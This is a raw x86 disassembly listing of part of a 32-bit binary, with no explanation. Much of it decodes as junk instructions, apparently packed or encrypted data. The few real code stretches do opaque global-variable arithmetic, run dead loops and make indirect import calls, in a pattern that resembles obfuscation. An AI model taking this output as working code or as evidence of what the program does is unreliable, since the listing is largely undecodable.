  4072d9:	add    edi,DWORD PTR gs:[ebx]
  4072dc:	in     eax,dx
  4072dd:	leave  
  4072de:	daa    
  4072df:	pop    ecx
  4072e0:	ins    DWORD PTR es:[edi],dx
  4072e1:	mov    DWORD PTR [ecx+0x4b98abb1],ecx
  4072e7:	add    eax,0x4470fb9f
  4072ec:	xchg   ebx,ebx
  4072ee:	out    dx,eax
  4072ef:	inc    ebx
  4072f0:	push   ss
  4072f1:	dec    ebx
  4072f2:	xor    ah,BYTE PTR [ebp+0x21]
  4072f5:	loopne 0x4072df
  4072f7:	push   esi
  4072f8:	push   ecx
  4072f9:	adc    dl,BYTE PTR [esi-0x670164f9]
  4072ff:	pop    ss
  407300:	std    
  407301:	mov    cl,0x44
  407303:	mov    eax,DWORD PTR [esi]
  407305:	and    al,0xe0
  407307:	and    DWORD PTR [edi+0x26],esp
  40730a:	scas   al,BYTE PTR es:[edi]
  40730b:	push   eax
  40730c:	pop    ebp
  40730d:	sbb    al,0x3f
  40730f:	ret    
  407310:	sar    BYTE PTR [esi+0xa],0x6c
  407314:	mov    ebx,0x2b2def74
  407319:	in     al,0x34
  40731b:	jmp    0x508e:0x28c7772d
  407322:	outs   dx,DWORD PTR ds:[esi]
  407323:	sbb    eax,0x2e4ffe02
  407328:	rcr    BYTE PTR [esp+edx*4],0xe4
  40732c:	jno    0x407377
  40732e:	ret    0xa7df
  407331:	pop    edx
  407332:	call   0x2776fd3f
  407337:	mov    esp,0x614abacb
  40733c:	xchg   ebp,eax
  40733d:	xchg   ebp,eax
  40733e:	es adc al,0x2e
  407341:	cmc    
  407342:	(bad)  
  407343:	(bad)  
  407344:	out    0x63,eax
  407346:	xchg   BYTE PTR [eax+edx*4+0xf],ah
  40734a:	test   BYTE PTR [edi],ah
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433757,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43382b
  40736f:	or     DWORD PTR ds:0x43382f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073e7
  407387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407388:	or     al,0xc7
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0xbf7e7e7c
  407393:	push   edi
  407394:	test   DWORD PTR [ebx+0x12],ecx
  407397:	xchg   edx,eax
  407398:	inc    ebx
  407399:	xchg   DWORD PTR [esi+eax*8],ebp
  40739c:	(bad)  
  40739e:	aam    0x73
  4073a0:	mov    bh,0xb6
  4073a2:	pop    eax
  4073a3:	retf   0x724e
  4073a6:	pop    ebx
  4073a7:	xor    al,0x8d
  4073a9:	mov    dl,0xa3
  4073ab:	fisttp WORD PTR [ebp+0x7829bb89]
  4073b1:	or     DWORD PTR [edi+eiz*8-0x7839ee6a],edx
  4073b8:	xor    al,0x23
  4073ba:	sar    DWORD PTR [ebp+0xd8e23c0],cl
  4073c0:	push   0x54
  4073c2:	(bad)  
  4073c4:	pop    ecx
  4073c5:	push   0xffffffac
  4073c7:	mov    eax,0xf63bb1e3
  4073cc:	pushf  
  4073cd:	(bad)  
  4073ce:	ins    DWORD PTR es:[edi],dx
  4073cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d0:	pop    esi
  4073d1:	rcr    DWORD PTR [esi-0x10c4ef62],1
  4073d7:	mov    ah,0xd9
  4073d9:	xchg   edi,eax
  4073da:	bound  eax,QWORD PTR [ecx-0x39]
  4073dd:	jmp    0x3a282f1a
  4073e2:	das    
  4073e3:	cmc    
  4073e4:	fisttp WORD PTR [ecx+0x65c8773]
  4073ea:	in     eax,0x3
  4073ec:	outs   dx,DWORD PTR ds:[esi]
  4073ed:	fisubr DWORD PTR [ecx+0x1d]
  4073f0:	(bad)  
  4073f1:	xor    al,0x19
  4073f3:	mov    al,ds:0xe840c634
  4073f8:	mov    bl,0x64
  4073fa:	xor    ch,BYTE PTR [edi+0x3f7d1c25]
  407400:	jecxz  0x4073ad
  407402:	lds    esi,FWORD PTR [ebp-0x53ae5632]
  407408:	push   ss
  407409:	or     DWORD PTR [eax-0x768889e0],edi
  40740f:	dec    esi
  407410:	cmp    al,0x1c
  407412:	jno    0x4073d2
  407414:	mov    bh,0x26
  407416:	jmp    0x9d9659e9
  40741b:	and    al,0x86
  40741d:	mov    ebx,0xa87a8081
  407422:	cwde   
  407423:	pop    edx
  407424:	hlt    
  407425:	push   ebx
  407426:	arpl   WORD PTR [edi-0x9],dx
  407429:	in     al,dx
  40742a:	pop    ecx
  40742b:	sbb    DWORD PTR [esi-0x6ef9999f],0xd9454aa2
  407435:	fwait
  407436:	cmp    ah,dl
  407438:	mul    al
  40743a:	cdq    
  40743b:	mov    bh,0x5d
  40743d:	mov    edi,0x81973236
  407442:	jne    0x4074b3
  407444:	rcr    BYTE PTR [ecx+0x3017dcf4],cl
  40744a:	aam    0x79
  40744c:	pop    ebx
  40744d:	xchg   esi,eax
  40744e:	retf   
  40744f:	or     DWORD PTR [edi+0x1eb5462e],esi
  407455:	or     BYTE PTR [ecx-0x7a],0xdd
  407459:	mov    ebx,0x4a55ccfe
  40745e:	mov    dh,0xb7
  407460:	int3   
  407461:	enter  0x8e65,0x8d
  407465:	adc    eax,0xfa533a99
  40746a:	xor    ebx,ecx
  40746c:	imul   eax,DWORD PTR [ebx-0x14],0xa
  407470:	add    eax,0xe1f28cd2
  407475:	adc    eax,0xbe26246a
  40747a:	fist   WORD PTR [esi-0x450f1044]
  407480:	mov    esi,0x68324674
  407485:	push   ss
  407486:	cmp    eax,DWORD PTR [eax+0x78c5293]
  40748c:	or     bh,BYTE PTR [eax-0x4c]
  40748f:	nop
  407490:	jno    0x4074d8
  407492:	mov    eax,0x64446141
  407497:	adc    al,bl
  407499:	(bad)  [edx+0x1aec67e6]
  40749f:	das    
  4074a0:	sub    edx,DWORD PTR [ebp+0x5586924]
  4074a6:	mov    edi,0x7a084b8
  4074ab:	stc    
  4074ac:	leave  
  4074ad:	sti    
  4074ae:	xchg   ebp,eax
  4074af:	sbb    esi,ecx
  4074b1:	int3   
  4074b2:	add    bl,cl
  4074b4:	dec    edi
  4074b5:	or     BYTE PTR ds:0xab32760c,cl
  4074bb:	push   ds
  4074bc:	mov    eax,ds:0x1ae93eb9
  4074c1:	add    al,0xf7
  4074c3:	mov    eax,0xda23eb5f
  4074c8:	cmp    al,0xab
  4074ca:	ins    DWORD PTR es:[edi],dx
  4074cb:	loope  0x40751f
  4074cd:	imul   edx,DWORD PTR ds:0x8492edc9,0xfffffff2
  4074d4:	test   BYTE PTR [ebp-0x3f800632],0x6f
  4074db:	dec    edi
  4074dc:	push   eax
  4074dd:	mov    ch,ch
  4074df:	hlt    
  4074e0:	mov    ds:0xdce18ddc,al
  4074e5:	retf   0x6153
  4074e8:	xchg   BYTE PTR [edx],ah
  4074ea:	pop    esi
  4074eb:	cmp    eax,0x9d391800
  4074f0:	xchg   ebx,eax
  4074f1:	ss aad 0x5d
  4074f4:	inc    edx
  4074f5:	call   0x939b:0x49f24499
  4074fc:	pop    eax
  4074fd:	dec    ecx
  4074fe:	sub    edx,ebx
  407500:	fidivr DWORD PTR [ecx+eiz*1]
  407503:	jo     0x407514
  407505:	xlat   BYTE PTR ds:[ebx]
  407506:	(bad)  
  407507:	aam    0xd3
  407509:	or     ch,ch
  40750b:	add    BYTE PTR [ecx-0x4a],0xc3
  40750f:	inc    ebp
  407510:	in     al,dx
  407511:	dec    esi
  407512:	or     ebp,esp
  407514:	imul   ebx,DWORD PTR [esi+ecx*2-0x4c],0xe7093a14
  40751c:	sbb    eax,0x64a92f1b
  407521:	cwde   
  407522:	aas    
  407523:	add    al,0x6e
  407525:	jge    0x4074bc
  407527:	mov    ds:0x2d19380f,eax
  40752c:	ja     0x407514
  40752e:	xchg   edx,eax
  40752f:	adc    al,0x61
  407531:	jmp    0xdb86:0x89e28ed7
  407538:	ds call 0x647c126b
  40753e:	pop    ebp
  40753f:	loope  0x407542
  407541:	repnz lods eax,DWORD PTR ds:[esi]
  407543:	xchg   edi,eax
  407544:	aam    0xc7
  407546:	fmul   QWORD PTR [eax-0x132a0bd]
  40754c:	push   ebx
  40754d:	jmp    0xcf1e:0x420d6da
  407554:	inc    edi
  407555:	fisub  DWORD PTR [ecx+ebp*8-0x3a]
  407559:	call   ecx
  40755b:	cdq    
  40755c:	in     al,dx
  40755d:	pop    ebx
  40755e:	push   ebp
  40755f:	sub    edx,DWORD PTR ds:0xbb122ef1
  407565:	das    
  407566:	out    dx,al
  407567:	mov    es,WORD PTR [eax+0x7e02f886]
  40756d:	mov    bh,0x20
  40756f:	lods   al,BYTE PTR ds:[esi]
  407570:	dec    ecx
  407571:	add    eax,0x8ffe903
  407576:	sub    edx,DWORD PTR [ecx+0x48]
  407579:	jmp    0x6b0d:0x520e32c1
  407580:	sbb    dl,BYTE PTR [ebx+0x333b623b]
  407586:	outs   dx,BYTE PTR ds:[esi]
  407587:	js     0x40756d
  407589:	cmp    al,dh
  40758b:	loop   0x4075d5
  40758d:	fs ins BYTE PTR es:[edi],dx
  40758f:	sahf   
  407590:	ins    BYTE PTR es:[edi],dx
  407591:	pop    esi
  407592:	jno    0x407548
  407594:	push   ss
  407595:	xchg   esi,eax
  407596:	bsr    ecx,DWORD PTR [ecx]
  407599:	sub    edx,DWORD PTR [ebp+ebp*2+0x71]
  40759d:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4075a4:	xor    eax,0x551
  4075a9:	mov    eax,0x9577
  4075ae:	mov    ecx,DWORD PTR ds:0x433753
  4075b4:	sub    DWORD PTR ds:0x43370f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4336ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43376b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43370f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43370f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43370f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43370f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43370f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	mov    ebx,esp
  407657:	ret    
  407658:	and    DWORD PTR [ecx],edx
  40765a:	sar    BYTE PTR [esi+0x7e],0x5
  40765e:	jl     0x4076de
  407660:	jle    0x4076d6
  407662:	jmp    0x12aa:0x1b08b935
  407669:	fistp  WORD PTR [eax+0x2a456d8a]
  40766f:	js     0x407698
  407671:	gs jecxz 0x407632
  407674:	cmp    ch,BYTE PTR ds:0x37efce1b
  40767a:	pop    ds
  40767b:	mov    eax,ds:0xcd195010
  407680:	xor    ah,BYTE PTR [edx-0x5ea3fbad]
  407686:	cmp    DWORD PTR [eax],ecx
  407688:	mov    eax,ds:0x4749103b
  40768d:	je     0x40766c
  40768f:	and    eax,0xf9d27252
  407694:	or     eax,0x5819ca4
  407699:	call   0x6f4d:0x1314a35b
  4076a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076a1:	xor    DWORD PTR [ecx],ebx
  4076a3:	mov    edx,0xfd70f6d7
  4076a8:	jmp    0x2e7c611f
  4076ad:	mov    al,0xd5
  4076af:	int3   
  4076b0:	(bad)  
  4076b1:	mov    ebp,0xd103dc54
  4076b6:	or     al,0xb1
  4076b8:	test   DWORD PTR [eax+0x37],eax
  4076bb:	jno    0x407710
  4076bd:	fdiv   st,st(4)
  4076bf:	xor    al,0x70
  4076c1:	sbb    al,0x2
  4076c3:	loop   0x40770c
  4076c5:	inc    esp
  4076c6:	and    BYTE PTR [ecx-0x38d24780],0xe7
  4076cd:	jge    0x4076b9
  4076cf:	jge    0x40766e
  4076d1:	jmp    0x241b:0xa40ad78e
  4076d8:	fidivr DWORD PTR [edx]
  4076da:	push   es
  4076db:	pop    esp
  4076dc:	loopne 0x40767c
  4076de:	jnp    0x40772b
  4076e0:	mov    al,ds:0x58176244
  4076e5:	out    0xc3,al
  4076e7:	inc    ebx
  4076e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076e9:	mov    bl,0xa8
  4076eb:	ss fs das 
  4076ee:	(bad)  
  4076ef:	popa   
  4076f0:	sub    eax,0xcfee58be
  4076f5:	pop    edx
  4076f6:	mov    ss,WORD PTR [eax+0x6f0d58b6]
  4076fc:	sti    
  4076fd:	mov    DWORD PTR [ecx-0x25],eax
  407700:	inc    eax
  407701:	and    ecx,DWORD PTR [eax+0x5c5ef0c6]
  407707:	or     bh,BYTE PTR [edi]
  407709:	ja     0x4076c2
  40770b:	pop    ecx
  40770c:	sahf   
  40770d:	enter  0xbbd5,0xb0
  407711:	adc    al,0x23
  407713:	aaa    
  407714:	popa   
  407715:	mov    al,0x4b
  407717:	aaa    
  407718:	inc    edx
  407719:	push   ss
  40771a:	inc    ecx
  40771c:	pop    ebp
  40771d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40771e:	mov    esi,0xe5237552
  407723:	in     eax,dx
  407724:	mov    bh,0xef
  407726:	sbb    ebx,ebp
  407728:	add    eax,0x12a6f4f0
  40772d:	test   al,0xfa
  40772f:	dec    eax
  407730:	and    ah,BYTE PTR [ebx-0x76618cfa]
  407736:	xchg   ebx,eax
  407737:	jno    0x4077b0
  407739:	(bad)  
  40773a:	pop    ebp
  40773b:	sub    al,0x24
  40773d:	out    0xf0,al
  40773f:	push   edi
  407740:	xor    dh,dh
  407742:	cmp    edi,DWORD PTR [edx+0x5a]
  407745:	inc    ebp
  407746:	and    bl,BYTE PTR ss:[ecx]
  407749:	inc    esi
  40774a:	outs   dx,BYTE PTR ds:[esi]
  40774b:	inc    esi
  40774c:	idiv   BYTE PTR [esi+0x60fff2f3]
  407752:	sbb    esp,DWORD PTR [edi-0x572844f2]
  407758:	repz inc ebp
  40775a:	js     0x4077b2
  40775c:	sub    al,0xb9
  40775e:	inc    esp
  40775f:	lods   al,BYTE PTR ds:[esi]
  407760:	pop    ds
  407761:	ror    DWORD PTR [ebp+0x14dc7273],0x2a
  407768:	aaa    
  407769:	imul   ecx,DWORD PTR [edx+0x8f23254],0x9adc1760
  407773:	ror    DWORD PTR [edi+0x35c5554],0xa4
  40777a:	and    ebp,esi
  40777c:	jbe    0x4077fb
  40777e:	fdivr  DWORD PTR [edi+ebp*1+0x357c97cc]
  407785:	and    eax,0xcf446c85
  40778a:	dec    ebx
  40778b:	jmp    0x3819:0xf48be57d
  407792:	test   al,0x23
  407794:	inc    edi
  407795:	inc    esp
  407796:	cmp    dl,ah
  407798:	mov    dh,0xf2
  40779a:	jmp    0x407807
  40779c:	cld    
  40779d:	lods   al,BYTE PTR ds:[esi]
  40779e:	xchg   dh,ah
  4077a0:	mov    esp,0xc86f1fb1
  4077a5:	inc    ecx
  4077a6:	push   es
  4077a7:	adc    BYTE PTR [edx+0x414e3c9f],dl
  4077ad:	mov    edx,0xcc2d7aee
  4077b2:	cld    
  4077b3:	cwde   
  4077b4:	repz jo 0x407834
  4077b7:	xchg   edi,eax
  4077b8:	ins    BYTE PTR es:[edi],dx
  4077b9:	js     0x407758
  4077bb:	pop    ds
  4077bc:	not    BYTE PTR [ecx+0x84bfa7f]
  4077c2:	mov    ebx,0x72af21e1
  4077c7:	test   BYTE PTR [edx+0x4],dh
  4077ca:	lods   eax,DWORD PTR ds:[esi]
  4077cb:	retf   
  4077cc:	fistp  QWORD PTR [eax+0xa]
  4077cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077d0:	pop    esp
  4077d1:	pop    ss
  4077d2:	jns    0x4077c7
  4077d4:	cwde   
  4077d5:	pop    ecx
  4077d6:	lahf   
  4077d7:	in     al,0x7a
  4077d9:	xor    edx,0x4
  4077dc:	loope  0x4077f8
  4077de:	add    esi,DWORD PTR [ecx+0x6f68f068]
  4077e4:	out    0xa2,eax
  4077e6:	or     BYTE PTR [ecx-0x7e1eab65],bl
  4077ec:	dec    edi
  4077ed:	lds    esi,FWORD PTR ds:0x4c7622b0
  4077f3:	arpl   WORD PTR [esi-0x4d],si
  4077f6:	mov    dh,0x2
  4077f8:	sar    dh,cl
  4077fa:	push   es
  4077fb:	xchg   edi,eax
  4077fc:	sbb    DWORD PTR [edi-0x6ea80477],esi
  407802:	je     0x4077ae
  407804:	icebp  
  407805:	(bad)  
  407806:	jnp    0x40783d
  407808:	sbb    al,0xf5
  40780a:	mov    edx,0x53a93f9e
  40780f:	pop    eax
  407810:	push   ebx
  407811:	xor    DWORD PTR [esp+ecx*2],ecx
  407814:	adc    ecx,ecx
  407816:	dec    esp
  407817:	or     eax,0xa9862bb2
  40781c:	xchg   ebx,eax
  40781d:	push   eax
  40781e:	sbb    al,0x35
  407820:	loope  0x4077d6
  407822:	and    eax,0x3aa6c8b0
  407827:	mov    al,ds:0x147e41a
  40782c:	mov    ds:0x8a64e946,al
  407831:	in     al,0xf4
  407833:	mov    dl,0x56
  407835:	arpl   WORD PTR [esi-0x6d],si
  407838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407839:	adc    eax,0x6f5f5bce
  40783e:	xchg   DWORD PTR [ebx-0x3e],ebp
  407841:	fsubr  st(0),st
  407843:	(bad)  
  407844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407845:	jmp    0x3e4e:0xeca2d214
  40784c:	mov    eax,ds:0x84f1d45b
  407851:	mov    cs,WORD PTR [edx]
  407853:	mov    dh,0xc5
  407855:	add    ecx,ecx
  407857:	(bad)  
  407858:	or     BYTE PTR [edx],bh
  40785a:	cmp    al,0x6d
  40785c:	or     al,0xf3
  40785e:	sbb    ebp,DWORD PTR [ecx]
  407860:	cdq    
  407861:	sbb    bh,BYTE PTR [esi-0x56d1e6]
  407867:	push   esp
  407868:	adc    cl,BYTE PTR [edi+0x6d]
  40786b:	ret    
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4336ff,0x433763
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43381b,0x12
  40788b:	cmp    DWORD PTR ds:0x43381b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43381b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43381b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43381b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43379f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43379f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43379f,esi
  4078e0:	cmp    DWORD PTR ds:0x43379f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43379f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x9,eax
  407922:	hlt    
  407923:	fldz   
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0x177e7e7c
  40792e:	cld    
  40792f:	pop    ds
  407930:	push   esp
  407931:	stc    
  407932:	add    ah,al
  407934:	pop    ds
  407935:	pop    esp
  407936:	mov    edi,0xe9ca3b7c
  40793b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40793c:	mov    edi,0xe83a34f0
  407941:	cdq    
  407942:	arpl   sp,sp
  407944:	pop    ebp
  407945:	ror    DWORD PTR [edx+eiz*2+0x72],0x76
  40794a:	pop    ds
  40794b:	in     eax,dx
  40794c:	dec    eax
  40794d:	in     al,dx
  40794e:	out    0xc6,eax
  407950:	hlt    
  407951:	sbb    al,0x10
  407953:	and    cl,ch
  407955:	cmp    edi,DWORD PTR [ecx-0x69]
  407958:	or     DWORD PTR [eax+0x1e],ebx
  40795b:	sahf   
  40795c:	call   0x60679398
  407961:	xor    ch,BYTE PTR [ebx+0x4a7b910b]
  407967:	push   ebp
  407968:	lahf   
  407969:	call   0x4db8:0xa45cb573
  407970:	sub    DWORD PTR [ebp-0x5],ebp
  407973:	adc    bh,BYTE PTR [eax]
  407975:	ss ja  0x4079d3
  407978:	mov    bl,0x6a
  40797a:	scas   eax,DWORD PTR es:[edi]
  40797b:	outs   dx,BYTE PTR ds:[esi]
  40797c:	xor    al,BYTE PTR [ebx]
  40797e:	test   cl,bl
  407980:	dec    ecx
  407981:	clc    
  407982:	cmp    eax,0xb8fb1153
  407987:	outs   dx,DWORD PTR ds:[esi]
  407988:	std    
  407989:	sar    DWORD PTR [edx-0x1a],1
  40798c:	mov    ds:0xd630f0a8,al
  407991:	outs   dx,DWORD PTR ds:[esi]
  407992:	int3   
  407993:	(bad)  
  407994:	add    BYTE PTR ds:0x52b45a80,al
  40799a:	push   esi
  40799b:	jno    0x4079bd
  40799d:	and    DWORD PTR [eax],0xd4ed0060
  4079a3:	pop    edx
  4079a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079a5:	mov    edx,0xe5ffdb79
  4079aa:	add    DWORD PTR [edi+0x73],edi
  4079ad:	shl    BYTE PTR gs:[ebx+ebp*1],0x48
  4079b2:	pop    ebx
  4079b3:	dec    esp
  4079b4:	add    al,0x98
  4079b6:	push   edx
  4079b7:	xor    al,0xb9
  4079b9:	sar    BYTE PTR [edx+0x67],cl
  4079bc:	mov    bh,0x20
  4079be:	adc    BYTE PTR [eax-0x64122fbf],ch
  4079c4:	lea    ecx,[ebp-0x4ee1abc3]
  4079ca:	cli    
  4079cb:	stc    
  4079cc:	cmp    eax,0x91a282dc
  4079d1:	jns    0x4079c4
  4079d3:	test   al,0xc8
  4079d5:	in     al,dx
  4079d6:	cmp    al,0x11
  4079d8:	xor    bl,ch
  4079da:	lds    esp,FWORD PTR [ebp-0x3ff2d17b]
  4079e0:	cmp    BYTE PTR [edi],ah
  4079e2:	sbb    DWORD PTR [edi],edx
  4079e4:	inc    esp
  4079e5:	into   
  4079e6:	add    eax,0x8ed9eded
  4079eb:	ds pop edi
  4079ed:	pop    edx
  4079ee:	mov    bl,0x13
  4079f0:	jo     0x4079b9
  4079f2:	sub    cl,BYTE PTR [eax+ebp*8-0x17]
  4079f6:	mov    edx,DWORD PTR [ecx+0x467e56fa]
  4079fc:	xor    ch,BYTE PTR [ebp-0x2288f696]
  407a02:	and    ebx,DWORD PTR [esi]
  407a04:	and    al,0xd1
  407a06:	js     0x4079f0
  407a08:	int    0x2
  407a0a:	ja     0x4079f6
  407a0c:	xchg   edi,eax
  407a0d:	jno    0x4079ce
  407a0f:	sti    
  407a10:	mov    esp,0xd6d3d156
  407a15:	jle    0x407a7a
  407a17:	fadd   QWORD PTR [edi]
  407a19:	sub    esi,0xffffff94
  407a1c:	jae    0x4079fc
  407a1e:	inc    edi
  407a1f:	and    al,0x8a
  407a21:	fisub  DWORD PTR [ebx-0x31246e56]
  407a27:	push   ebp
  407a28:	mov    eax,DWORD PTR [edx+0x73525c5a]
  407a2e:	xor    eax,0xf3aa8eda
  407a33:	arpl   WORD PTR [ebx],di
  407a35:	in     al,dx
  407a36:	sbb    bl,BYTE PTR [ebx+eiz*8]
  407a39:	xchg   edi,eax
  407a3a:	lahf   
  407a3b:	sbb    edx,edi
  407a3d:	xchg   esi,eax
  407a3e:	push   0xfc0d2e8d
  407a43:	inc    ecx
  407a44:	mov    ds:0x739d9a4f,al
  407a49:	sbb    eax,0xa6dc7bae
  407a4e:	hlt    
  407a4f:	sar    BYTE PTR [edi-0x75],0x4b
  407a53:	lods   eax,DWORD PTR ds:[esi]
  407a54:	add    ecx,DWORD PTR ds:[esi+edi*4+0x5660b2c9]
  407a5c:	mov    bh,0xc3
  407a5e:	xor    DWORD PTR [esi],esp
  407a60:	pop    es
  407a61:	mov    eax,ds:0x275e8fdd
  407a66:	xchg   ebx,eax
  407a67:	lds    eax,FWORD PTR [eax+eiz*4+0x1824fa96]
  407a6e:	in     al,0x66
  407a70:	pushf  
  407a71:	cmp    al,0xc9
  407a73:	push   eax
  407a74:	cdq    
  407a75:	out    dx,eax
  407a76:	test   eax,0x60bd94e0
  407a7b:	inc    edi
  407a7c:	in     eax,dx
  407a7d:	sub    al,0x5
  407a7f:	push   ebx
  407a80:	pop    ds
  407a81:	and    al,0x8e
  407a83:	mov    esi,DWORD PTR [ebx+edi*4]
  407a86:	test   al,0x84
  407a88:	adc    ah,0xae
  407a8b:	mov    edx,0x92c2dbda
  407a90:	push   ecx
  407a91:	out    0x60,eax
  407a93:	std    
  407a94:	mov    ebx,0xe635c405
  407a99:	clc    
  407a9a:	std    
  407a9b:	ror    BYTE PTR [eax+ecx*2-0x5c],0x2a
  407aa0:	sbb    al,0xde
  407aa2:	and    bh,BYTE PTR [esi-0x5c54a9f7]
  407aa8:	inc    edi
  407aa9:	sub    esi,esp
  407aab:	js     0x407ab3
  407aad:	inc    edx
  407aae:	test   BYTE PTR [edi+edi*1-0x64],0xcb
  407ab3:	call   0x8c987f07
  407ab8:	jl     0x407a86
  407aba:	jo     0x407a9e
  407abc:	stc    
  407abd:	daa    
  407abe:	sub    WORD PTR [eax-0x1],dx
  407ac2:	jmp    0x407abc
  407ac4:	cld    
  407ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ac6:	clc    
  407ac7:	mov    WORD PTR [eax+0x3b],gs
  407aca:	div    esp
  407acc:	shl    ch,1
  407ace:	inc    esp
  407acf:	add    DWORD PTR [eax+0xb697421],esp
  407ad5:	call   0x85c9:0x21919451
  407adc:	aaa    
  407add:	xor    al,0xd0
  407adf:	ror    DWORD PTR [ebx+ebp*4-0x35abdcf2],cl
  407ae6:	and    DWORD PTR [ebx+0x7e],ebp
  407ae9:	xor    BYTE PTR [ecx],0x63
  407aec:	pop    edx
  407aed:	sbb    BYTE PTR [edx-0x4b],dh
  407af0:	sub    al,0x1b
  407af2:	or     edx,DWORD PTR [ebx+0x3466640d]
  407af8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407af9:	fimul  WORD PTR [ebp+0x4af14c54]
  407aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b00:	cdq    
  407b01:	(bad)  
  407b02:	pop    ds
  407b03:	adc    BYTE PTR [ecx+0x56],bh
  407b06:	mov    ds:0xbe29f280,eax
  407b0b:	cmp    bh,0x60
  407b0e:	inc    eax
  407b0f:	bound  ebx,QWORD PTR [ecx+0x1fea70c4]
  407b15:	inc    ebx
  407b16:	inc    esp
  407b17:	xchg   ebx,eax
  407b18:	jmp    0x1786:0xe1ee297a
  407b1f:	jmp    0xe439f848
  407b24:	out    0xcb,eax
  407b26:	dec    eax
  407b27:	pop    ds
  407b28:	stc    
  407b29:	mov    eax,0x5ebb5c61
  407b2e:	loop   0x407ac3
  407b30:	push   ds
  407b31:	test   dl,ah
  407b33:	dec    ebx
  407b34:	sub    DWORD PTR [ebp-0x3eccb51a],ecx
  407b3a:	adc    DWORD PTR ds:0x4337ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433753,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433707,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43382f,0x43370f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43379f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433703
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4337a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43371f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
